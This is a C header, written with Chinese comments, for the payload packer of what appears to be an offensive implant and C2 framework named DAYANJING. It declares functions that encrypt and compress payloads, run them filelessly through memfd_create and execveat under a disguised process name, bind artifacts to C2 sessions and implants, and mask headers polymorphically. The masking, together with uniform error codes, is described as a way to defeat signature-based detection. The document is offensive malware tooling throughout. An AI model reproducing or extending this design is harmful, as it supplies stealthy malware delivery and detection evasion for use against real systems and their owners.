/*
 * DAYANJING v4 — 20_packer / packer.h
 *
 * 自研打包器：把任意载荷（ELF / PE / 原始 shellcode）封装成单一密文制品，
 * 运行时在内存中解压 -> 解密 -> 校验 -> 执行，全程不落盘。
 *
 * 分层（由内向外）：
 *   1. 压缩层  LZSS（自研，窗口 4096，匹配长 3..18）
 *   2. 加密层  AES-128-GCM（复用 00_crypto，不自研第二套）
 *   3. 完整性  GCM tag（覆盖密文）+ SHA-256（覆盖明文，防密钥正确但内容被换）
 *   4. 执行层  memfd_create + execveat(AT_EMPTY_PATH)（Linux）
 *
 * 制品格式（小端，全部显式写入，不依赖结构体内存布局）：
 *   off  0   magic      8    "DJPAK\1\0\0"
 *   off  8   version    4
 *   off 12   flags      4    bit0 = 载荷经压缩
 *   off 16   raw_len    8    原始长度
 *   off 24   pay_len    8    密文长度（= 明文长度，GCM 不膨胀）
 *   off 32   salt       16   HKDF salt
 *   off 48   iv         12   GCM nonce
 *   off 60   tag        16   GCM tag
 *   off 76   raw_sha    32   原始明文 SHA-256
 *   off 108  密文 ...
 *
 * AAD = magic|version|flags|raw_len|pay_len|salt|raw_sha（80 字节）
 *   —— 头部一旦被改（含长度字段、salt），解包必然 AUTH 失败。
 *
 * 不依赖 OpenSSL / zlib，仅 libc。
 */

#ifndef DAYANJING_PACKER_H
#define DAYANJING_PACKER_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ---- 常量 ---- */
#define PK_MAGIC_LEN   8
#define PK_SALT_LEN    16
#define PK_IV_LEN      12
#define PK_TAG_LEN     16
#define PK_SHA_LEN     32
#define PK_KEY_LEN     16
#define PK_HDR_LEN     108   /* v1: 8+4+4+8+8+16+12+16+32 */
#define PK_BIND_ID_LEN 32
#define PK_HDR_V2_LEN  140   /* v2: v1 头 + bind_id(32) */
#define PK_HDR_V3_LEN  176   /* v3: v2 头 + epoch(4) + eph_pub(32) */
#define PK_VERSION     1     /* 已废弃：pk_unpack 拒绝解 v1，仅内部压测用 */
#define PK_VERSION2    2     /* 会话绑定制品：bind_id 纳入 AAD */
#define PK_VERSION3    3     /* 纪元 + ephemeral X25519：制品具备前向保密 */
#define PK_VERSION4    4     /* 多态头：整头掩码，制品无跨样本恒定字节 */
#define PK_FLAG_COMPRESSED 0x1u

/* ---- v4 多态头制品 ---- */
#define PK_NONCE_LEN   16    /* 每制品随机的掩码 nonce（明文，唯一非随机常量位） */
#define PK_HDR_V4_LEN  (PK_NONCE_LEN + PK_HDR_V3_LEN)   /* 192：nonce + 掩码头 */
#define PK_AAD_V4_LEN  (PK_NONCE_LEN + PK_HDR_V3_LEN)   /* 192：nonce + 真实头 */
#define PK_SHAPED_OVERHEAD (PK_HDR_V4_LEN + PK_TAG_LEN) /* 208：另加末尾 tag */

/* v3 制品头附加字段长度 */
#define PK_EPOCH_LEN    4    /* 制品纪元字段（u32 小端，明文，纳入 AAD） */
#define PK_EPH_PUB_LEN  32   /* X25519 临时公钥（明文，纳入 AAD） */

/* 会话绑定派生所需的密钥材料长度（对齐 02_c2 的 C2_KEY_LEN） */
#define PK_SESSION_KEY_LEN 16

/* LZSS 参数：距离字段 12 位，故最大距离 4095（不是 4096） */
#define PK_LZSS_WINDOW   4096
#define PK_LZSS_MAX_OFF  4095
#define PK_LZSS_MIN_MATCH 3
#define PK_LZSS_MAX_MATCH 18
#define PK_LZSS_PREFIX   8      /* 压缩流头部：8 字节 LE 原始长度 */

/* ---- 返回值 ---- */
#define PK_OK            0
#define PK_ERR_ARG      -1   /* 参数非法 */
#define PK_ERR_NOMEM    -2   /* 输出缓冲不足 */
#define PK_ERR_SMALL    -3   /* 制品过短，不构成合法头 */
#define PK_ERR_MAGIC    -4
#define PK_ERR_VERSION  -5
#define PK_ERR_LEN      -6   /* 长度字段不自洽 */
#define PK_ERR_AUTH     -7   /* GCM 验签失败（篡改 / 密钥错） */
#define PK_ERR_HASH     -8   /* 明文 SHA-256 不符 */
#define PK_ERR_CORRUPT  -9   /* 压缩流损坏 */
#define PK_ERR_SYS      -10  /* 系统调用失败 */
#define PK_ERR_BIND     -11  /* 绑定标识不符（制品属于另一会话/植入体） */
#define PK_ERR_DEGEN    -12  /* 密钥退化：k_c2s == k_s2c，拒绝派生 */
#define PK_ERR_EXPIRED  -13  /* 制品纪元已滚出植入体保留窗口（前向保密生效） */
#define PK_ERR_IMPLID   -14  /* implant_id 非法（空/超长/不可打印/含分隔符） */
#define PK_ERR_CANON    -15  /* 绑定上下文非规范编码（防多编码同义） */

typedef struct {
    uint32_t version;
    uint32_t flags;
    uint64_t raw_len;
    uint64_t pay_len;
    uint8_t  salt[PK_SALT_LEN];
    uint8_t  iv[PK_IV_LEN];
    uint8_t  tag[PK_TAG_LEN];
    uint8_t  raw_sha[PK_SHA_LEN];
    uint8_t  bind_id[PK_BIND_ID_LEN];  /* v2 起有效；v1 全零 */
    uint32_t epoch;                    /* v3 起有效；v1/v2 为 0 */
    uint8_t  eph_pub[PK_EPH_PUB_LEN];  /* v3 起有效：打包方临时 X25519 公钥 */
} pk_hdr;

const char *pk_errstr(int e);

/* ====================================================================
 * 头部
 * ==================================================================== */

/* 解析头部。blob_len 至少 PK_HDR_LEN，否则 PK_ERR_SMALL。 */
int pk_header_parse(const uint8_t *blob, size_t blob_len, pk_hdr *h);

/* 给定原始长度，返回打包后所需的最大字节数（用于分配缓冲）。 */
size_t pk_size_bound(size_t raw_len);

/* ====================================================================
 * LZSS 压缩层
 * ==================================================================== */

/*
 * 压缩。out_len 传入输出缓冲容量，返回时写为实际写出长度。
 * 输出为 8 字节 LE 原始长度前缀 + 位流，自描述。
 * 若压缩后不小于原始长度，调用方应改用原样载荷（见 pk_pack 的回退逻辑），
 * 本函数不做该判断——它只负责压。
 */
int pk_lzss_compress(const uint8_t *in, size_t in_len,
                     uint8_t *out, size_t *out_len);

/*
 * 解压。out_len 传入容量（必须 >= 前缀声明的原始长度，否则 NOMEM），
 * 返回时写为实际长度。以长度前缀为终止条件，不受尾部填充位影响。
 * 压缩流损坏（引用越界、长度不足）返回 PK_ERR_CORRUPT。
 */
int pk_lzss_decompress(const uint8_t *in, size_t in_len,
                       uint8_t *out, size_t *out_len);

/* ====================================================================
 * 打包 / 解包
 * ==================================================================== */

/*
 * 打包：压缩（若有利）-> AES-128-GCM 加密 -> 写出 头||密文。
 * seed 为密钥材料（构建期随机生成并编译进 stub；或运行时派生）。
 * out_len 传入容量（>= pk_size_bound），返回实际长度。
 * salt / iv 由本函数从系统熵源生成；失败返回 PK_ERR_SYS。
 */
int pk_pack(const uint8_t *raw, size_t raw_len,
            const uint8_t *seed, size_t seed_len,
            uint8_t *out, size_t *out_len);

/*
 * 解包：校验头 -> GCM 验签 -> 解密 -> （若 flag）解压 -> SHA-256 比对。
 * out_len 传入容量（>= h.raw_len），返回实际长度。
 */
int pk_unpack(const uint8_t *blob, size_t blob_len,
              const uint8_t *seed, size_t seed_len,
              uint8_t *out, size_t *out_len);

/* ====================================================================
 * 内存执行（Linux）
 * ==================================================================== */

/*
 * 把 ELF 映像写入匿名内存文件并以 execveat(AT_EMPTY_PATH) 执行。
 * 成功则不返回（进程映像被替换）；失败返回负的错误码。
 * argv[0] 建议传入伪装名；envp 可为 NULL（继承空环境更安全时用 environ）。
 */
int pk_mexec(const uint8_t *elf, size_t len,
             char *const argv[], char *const envp[]);

/* 仅创建匿名内存文件并写入内容，返回 fd（>=0）或负错误码。 */
int pk_memfd_write(const uint8_t *data, size_t len);

/* ====================================================================
 * 会话绑定（把制品与 C2 会话 / 植入体绑定）
 * ====================================================================
 *
 * 目的：制品只在持有该会话密钥的一侧可解开，且不能在不同会话/植入体之间
 *       互换（A 的制品搬到 B 上会被 bind_id 拒绝，而不是解出错误内容）。
 *
 * 不引入对 02_c2 的编译依赖：本层只吃原始密钥材料 + 不透明绑定上下文。
 * 由调用方（或部署器）负责把 02_c2 的会话参数序列化成 bind_ctx。
 *
 *   seed    = HKDF-Extract(salt = bind_ctx,
 *                          ikm  = k_c2s || k_s2c)
 *             -> Expand(info = "dayanjing:packer:seed:v1", 32 字节)
 *   bind_id = SHA-256("dayanjing:packer:bind:v1" || bind_ctx)
 *
 * 域分离：与 C2 通信密钥、洋葱层密钥使用不同 info 标签，互不推导。
 */

/*
 * 从会话密钥派生打包种子。k_c2s / k_s2c 各 16 字节，bind_ctx 可为 NULL
 * （ctx_len==0 表示无绑定上下文，安全性下降，仅用于测试）。
 * k_c2s == k_s2c 时返回 PK_ERR_DEGEN 且不输出种子。
 */
int pk_session_seed(const uint8_t k_c2s[PK_SESSION_KEY_LEN],
                    const uint8_t k_s2c[PK_SESSION_KEY_LEN],
                    const uint8_t *bind_ctx, size_t bind_ctx_len,
                    uint8_t seed[PK_SHA_LEN]);

/* 计算绑定标识。bind_ctx 为 NULL 时按空上下文计算。 */
int pk_bind_id(const uint8_t *bind_ctx, size_t bind_ctx_len,
               uint8_t id[PK_BIND_ID_LEN]);

/* 打包为 v2 会话绑定制品（头内含 bind_id，且 bind_id 纳入 AAD）。 */
int pk_pack_session(const uint8_t *raw, size_t raw_len,
                    const uint8_t k_c2s[PK_SESSION_KEY_LEN],
                    const uint8_t k_s2c[PK_SESSION_KEY_LEN],
                    const uint8_t *bind_ctx, size_t bind_ctx_len,
                    uint8_t *out, size_t *out_len);

/*
 * 解包 v2 会话绑定制品。先比对 bind_id（不符返回 PK_ERR_BIND），再验签。
 * 这样"制品被换成另一个会话的产物"能给出明确错误，而非笼统的 AUTH 失败。
 */
int pk_unpack_session(const uint8_t *blob, size_t blob_len,
                      const uint8_t k_c2s[PK_SESSION_KEY_LEN],
                      const uint8_t k_s2c[PK_SESSION_KEY_LEN],
                      const uint8_t *bind_ctx, size_t bind_ctx_len,
                      uint8_t *out, size_t *out_len);

/* 从制品中取出 bind_id（v1 返回全零并正常返回 0）。 */
int pk_artifact_bind_id(const uint8_t *blob, size_t blob_len,
                        uint8_t id[PK_BIND_ID_LEN]);

/* v2 制品尺寸上界（供分配缓冲）。 */
size_t pk_size_bound_v2(size_t raw_len);

/* v3 制品尺寸上界（供分配缓冲）。 */
size_t pk_size_bound_v3(size_t raw_len);

/* ====================================================================
 * 规范化绑定上下文（消除"调用方随意序列化"导致的绑定退化）
 * ====================================================================
 *
 * v2 接受任意 bind_ctx 字节串，两个不同会话若碰巧拼出相同字节，绑定即失效。
 * v3 改为只接受结构化 pk_binding_t，并由本模块做规范编码（canonical）：
 *
 *   编码 = 域标签 || u32(version) || 16B(server_static_id)
 *          || u16(nid) || implant_id 字节 || u64(generation) || u32(epoch)
 *
 * 单射性由三点保证：
 *   1. 固定字段顺序 + 固定宽度（id 16B、generation u64、epoch u32）
 *   2. implant_id 以 u16 长度前缀引导，不做 NUL 分隔 —— 无法用内容伪造边界
 *   3. implant_id 字符集受限（可打印 ASCII，禁 '/'、'\\'、'.'、NUL）
 *
 * 解码端额外做 canonical 校验：缓冲区剩余字节必须全零，
 * 因此"同一结构体两种编码"会被判为 PK_ERR_CANON 而非静默接受。
 */

#define PK_BINDING_VERSION  1u
#define PK_SERVER_ID_LEN    16
#define PK_IMPLANT_ID_MAX   63   /* 不含 NUL；上限由 u16 长度前缀决定 */

typedef struct {
    uint32_t version;                    /* 必须为 PK_BINDING_VERSION */
    uint8_t  server_static_id[PK_SERVER_ID_LEN];
    char     implant_id[PK_IMPLANT_ID_MAX + 1u];
    uint64_t generation;                 /* C2 侧会话代数（密钥轮换用） */
    uint32_t epoch;                      /* 制品纪元（与植入体密钥轮换联动） */
} pk_binding_t;

/*
 * 校验并规范编码。out 可为 NULL（仅探测长度）。
 * 成功返回编码长度；缓冲不足返回 PK_ERR_NOMEM。
 * implant_id 非法返回 PK_ERR_IMPLID；version 不为 1 返回 PK_ERR_VERSION。
 */
int pk_binding_encode(const pk_binding_t *b, uint8_t *out, size_t cap,
                      size_t *out_len);

/*
 * 解码。做 canonical 校验（尾部必须全零、nid 与字符串长度一致、
 * implant_id 字符集合法）。非规范编码返回 PK_ERR_CANON。
 */
int pk_binding_decode(const uint8_t *in, size_t in_len, pk_binding_t *out);

/*
 * 由 02_c2 的会话参数构造绑定结构体（等价于 c2_build_context 的输入面，
 * 但这里产出结构化对象而非不透明字节，供打包器内部使用）。
 * epoch 由调用方显式给出（制品纪元）。
 */
int pk_binding_make(const uint8_t server_static_id[PK_SERVER_ID_LEN],
                    const char *implant_id,
                    uint64_t generation,
                    uint32_t epoch,
                    pk_binding_t *out);

/* ====================================================================
 * 植入体静态密钥轮换（制品层前向保密）
 * ====================================================================
 *
 * v2 的种子直接由会话密钥派生：会话密钥一旦泄露，历史录制的制品可离线解开。
 * v3 引入 X25519 ephemeral-static + 静态密钥按纪元轮换：
 *
 *   打包方（C2）：为每件制品生成临时密钥对 (e, E)
 *                 ss = X25519(e, pk_implant@epoch)
 *                 E 写进制品头（纳入 AAD）；e 用完立即安全擦除
 *   植入体：      ss = X25519(sk_implant@epoch, E)
 *
 * 前向保密来源：植入体每个 epoch 重新生成静态密钥对，滚出保留窗口的
 * 私钥被 secure_zero 擦除。此后即便拿到会话密钥 + 完整录制制品
 * （制品里只有 E，没有 sk），也无法重算 ss —— 历史制品永久解不开。
 *
 * 保留窗口 PK_RETAIN = 2（当前 + 上一个）：容忍在途制品。
 * 改 1 = PFS 立即生效但可能解不开刚下发的制品；改大则 PFS 生效更慢。
 */

#define PK_RETAIN        2
#define PK_IMPLANT_SK_LEN 32
#define PK_IMPLANT_PK_LEN 32

typedef struct {
    uint32_t epoch;
    uint8_t  sk[PK_IMPLANT_SK_LEN];
    uint8_t  pk[PK_IMPLANT_PK_LEN];
} pk_keyslot_t;

typedef struct {
    pk_keyslot_t slots[PK_RETAIN];   /* slots[0] 为最新 */
    int          n;
    uint32_t     next_epoch;
} pk_implant_key_t;

/* 初始生成 epoch 0 密钥对。 */
int  pk_implant_key_init(pk_implant_key_t *k);

/* 安全擦除全部槽位（含所有私钥）。 */
void pk_implant_key_wipe(pk_implant_key_t *k);

/*
 * 轮换到下一纪元：新密钥对入槽，滚出窗口的旧私钥安全擦除。
 * new_epoch 可为 NULL。
 */
int  pk_implant_key_rotate(pk_implant_key_t *k, uint32_t *new_epoch);

/* 取当前纪元的静态公钥（打包方用它算 ss）。 */
int  pk_implant_key_pub(const pk_implant_key_t *k,
                        uint8_t out[PK_IMPLANT_PK_LEN]);

/* 是否仍持有某纪元的私钥。 */
int  pk_implant_key_has_epoch(const pk_implant_key_t *k, uint32_t epoch);

/* 主动丢弃某纪元私钥（立即让该纪元制品失效）。 */
int  pk_implant_key_forget(pk_implant_key_t *k, uint32_t epoch);

/* ====================================================================
 * v3 制品：ephemeral-static 派生 + 纪元联动
 * ====================================================================
 *
 *   ikm  = ss(32) || k_c2s(16) || k_s2c(16)
 *   seed = HKDF-Extract(salt = binding_encode(b), ikm)
 *          -> Expand(info = "dayanjing:packer:artifact:v3", 32 字节)
 *
 * ss 提供单向性与前向保密；会话密钥提供"只有该会话能解"的绑定。
 * 任一缺失都不够：只有 ss 则任何拿到植入体公钥者都能造制品；
 * 只有会话密钥则无 PFS。
 */

/*
 * 打包方派生种子（需要植入体静态公钥，不需要其私钥）。
 * eph_priv 若为 NULL 则内部生成并在返回前擦除；
 * 非 NULL 时调用方须自行擦除（测试用）。
 */
int pk_artifact_seed(const pk_binding_t *b,
                     const uint8_t k_c2s[PK_SESSION_KEY_LEN],
                     const uint8_t k_s2c[PK_SESSION_KEY_LEN],
                     const uint8_t pk_implant[PK_IMPLANT_PK_LEN],
                     uint8_t eph_pub_out[PK_EPH_PUB_LEN],
                     uint8_t seed[PK_SHA_LEN]);

/*
 * 解包方派生种子（需要植入体静态私钥，由纪元定位）。
 * epoch 不存在于保留窗口时返回 PK_ERR_EXPIRED。
 */
int pk_artifact_seed_open(const pk_implant_key_t *k,
                          const pk_binding_t *b,
                          const uint8_t k_c2s[PK_SESSION_KEY_LEN],
                          const uint8_t k_s2c[PK_SESSION_KEY_LEN],
                          const uint8_t eph_pub[PK_EPH_PUB_LEN],
                          uint8_t seed[PK_SHA_LEN]);

/*
 * 打包为 v3 制品。调用方提供植入体当前静态公钥。
 * 返回的制品头内含 epoch 与临时公钥，二者均纳入 AAD。
 */
int pk_pack_artifact(const uint8_t *raw, size_t raw_len,
                     const pk_binding_t *b,
                     const uint8_t k_c2s[PK_SESSION_KEY_LEN],
                     const uint8_t k_s2c[PK_SESSION_KEY_LEN],
                     const uint8_t pk_implant[PK_IMPLANT_PK_LEN],
                     uint8_t *out, size_t *out_len);

/*
 * 解包 v3 制品。纪元从制品头读取并由植入体密钥窗口校验：
 *   - 纪元不在窗口内        -> PK_ERR_EXPIRED（前向保密已生效）
 *   - 纪元在但密钥/绑定不符 -> PK_ERR_AUTH / PK_ERR_BIND
 */
int pk_unpack_artifact(const uint8_t *blob, size_t blob_len,
                       const pk_implant_key_t *k,
                       const pk_binding_t *b,
                       const uint8_t k_c2s[PK_SESSION_KEY_LEN],
                       const uint8_t k_s2c[PK_SESSION_KEY_LEN],
                       uint8_t *out, size_t *out_len);

/* 取制品头中的纪元（v1/v2 返回 0 并正常返回 PK_OK）。 */
int pk_artifact_epoch(const uint8_t *blob, size_t blob_len, uint32_t *epoch);

/* ====================================================================
 * v4 多态头制品（shaped artifact）
 *
 * 与 v3 的差别不是"多一个字段"，而是识别方式的改变：
 *   v3 及以前 —— 制品前 12 字节是恒定的 magic + version，识别靠常量；
 *   v4        —— 整头用"会话种子 + 每制品随机 nonce"派生的掩码覆盖，
 *                制品上不存在任何跨样本恒定字节，识别只能靠"能否解开"。
 *
 * 由此派生的一条硬规则：所有结构性错误一律返回 PK_ERR_AUTH，不返回
 * MAGIC / VERSION / LEN。错误码本身也是一个 oracle——用它区分"不是制品"
 * 与"密钥不对"，等价于把常量签名换了个位置。
 * ==================================================================== */

size_t pk_size_bound_v4(size_t raw_len);

int pk_pack_shaped(const uint8_t *raw, size_t raw_len,
                   const uint8_t *seed, size_t seed_len,
                   const uint8_t bind_id[PK_BIND_ID_LEN],
                   uint32_t epoch,
                   const uint8_t eph_pub[PK_EPH_PUB_LEN],
                   uint8_t *out, size_t *out_len);

int pk_unpack_shaped(const uint8_t *blob, size_t blob_len,
                     const uint8_t *seed, size_t seed_len,
                     uint8_t *out, size_t *out_len);

/* O(1) 查询：只需派生掩码，不需 GCM 解密。 */
int pk_shaped_epoch(const uint8_t *blob, size_t blob_len,
                    const uint8_t *seed, size_t seed_len,
                    uint32_t *epoch);

int pk_shaped_bind_id(const uint8_t *blob, size_t blob_len,
                      const uint8_t *seed, size_t seed_len,
                      uint8_t id[PK_BIND_ID_LEN]);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_PACKER_H */
